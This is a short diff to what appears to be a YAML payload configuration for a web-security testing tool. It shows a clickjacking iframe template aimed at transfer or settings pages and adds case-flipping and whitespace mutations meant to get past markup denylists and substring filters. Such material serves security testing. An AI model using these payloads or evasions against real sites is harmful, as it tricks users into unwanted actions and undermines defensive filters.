@@ -28,7 +28,11 @@ payloads:
     template: '<iframe src="{target_url}" style="opacity:0.1;width:600px;height:400px"></iframe><p>Click to continue</p>'
     confidence: suspected
     notes: Targets a state-changing action page (transfer/settings) framed at low opacity for click-redressing.
-mutations: []
+mutations:
+  - name: case_flip
+    description: HTML tag/attribute names are case-insensitive; flipping case defeats naive substring filters on frame markup.
+  - name: whitespace_alt
+    description: Alternate whitespace inside the iframe tag to slip past header/markup denylists.
 encodings:
   - name: identity
     stages: []
